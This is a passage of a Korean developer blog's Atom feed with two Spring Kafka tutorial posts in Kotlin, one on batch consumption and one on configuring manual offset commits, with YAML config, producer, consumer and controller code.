&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.ResponseStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.RestController&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.IOException&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@RestController&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Operation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;summary&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user 메세지 생성 및 처리&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@ResponseStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@Throws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;nd&quot;&gt;@GetMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;produces&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MediaType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;APPLICATION_JSON_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
        &lt;span class=&quot;n&quot;&gt;userProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello world message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResponseEntity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
            &lt;span class=&quot;s&quot;&gt;&quot;success&quot;&lt;/span&gt;  
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;카프카 메세지 생성 및 소비 명령
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;curl http://localhost:8080/user  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;결과&quot;&gt;결과&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;배치 단위로 잘 넘어온다.
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;record++[hello world message]  
record++[hello world message, hello world message]  
record++[hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message]  
record++[hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message]  
record++[hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message]  
record++[hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message, hello world message]  
record++[hello world message, hello world message, hello world message, hello world message]  
            
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;max.poll.records=20은 최대값일 뿐이므로 &lt;br /&gt;
적절한 규모로 배치가 넘어오는 것을 확인할 수 있다.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Kafka" /><category term="kafka" /><category term="spring" /><category term="kotlin" /><category term="batch" /><summary type="html">개요 컨슈머에서 폴링 시 배치 단위로 가져오게 할 수 있다. 이를 통하여 처리 성능을 높일 수 있다.</summary></entry><entry><title type="html">Spring Kafka 컨슈머 수동 커밋 설정</title><link href="https://a3magic3pocket.github.io/posts/spring-kafka-manual-commit-config/" rel="alternate" type="text/html" title="Spring Kafka 컨슈머 수동 커밋 설정" /><published>2025-04-11T22:32:36+09:00</published><updated>2025-04-11T22:32:36+09:00</updated><id>https://a3magic3pocket.github.io/posts/spring-kafka-manual-commit-config</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/spring-kafka-manual-commit-config/">&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;카프카 기본 설정은 오토 커밋이다.&lt;/li&gt;
  &lt;li&gt;이 경우, 컨슈머가 메시지를 실제로 처리했는지와 무관하게, &lt;br /&gt;
일정 시간이 지나면 자동으로 오프셋이 커밋된다.&lt;/li&gt;
  &lt;li&gt;그 결과 메세지가 유실될 수 있다.&lt;/li&gt;
  &lt;li&gt;이를 방지하기 위해 수동 커밋을 설정한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;설정&quot;&gt;설정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;application.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;spring&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;kafka&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;bootstrap-servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kafka:9092&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;producer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;key-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringSerializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-serializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonSerializer&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;auto-offset-reset&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;latest&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# |--추가 시작--|  &lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;enable-auto-commit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# |--추가 끝--|  &lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;key-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.apache.kafka.common.serialization.StringDeserializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;value-deserializer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;org.springframework.kafka.support.serializer.JsonDeserializer&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;s&quot;&gt;spring.json.trusted.packages&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;KafkaConfig
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.config&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Bean&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Configuration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.ConsumerFactory&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.ContainerProperties&lt;/span&gt;  
            
&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@Bean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kafkaListenerContainerFactory&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;factory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentKafkaListenerContainerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;()&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;  
         &lt;span class=&quot;c1&quot;&gt;// AckMode.MANUAL로 설정해야 수동커밋이 활성화된다.  &lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ackMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ContainerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AckMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MANUAL&lt;/span&gt;  
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factory&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;프로듀서
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant.KafkaTopic&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.KafkaTemplate&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
            
            
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
            
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;컨슈머
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Component&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserConsumer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
            
    &lt;span class=&quot;nd&quot;&gt;@KafkaListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;topics&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;  
        &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        &lt;span class=&quot;c1&quot;&gt;// 👇 AckMode.MANUAL 로 설정한 카프카 컨테이너 팩토리 추가  &lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;containerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;kafkaListenerContainerFactory&quot;&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConsumerRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;record++&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
            
        &lt;span class=&quot;c1&quot;&gt;// 수동 커밋  &lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;acknowledgment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;acknowledge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;컨트롤러
    &lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.controller&lt;/span&gt;  
            
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer.UserProducer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io.swagger.v3.oas.annotations.Operation&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.HttpStatus&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.MediaType&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.http.ResponseEntity&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.web.bind.annotation.GetMapping&lt;/span&gt;  
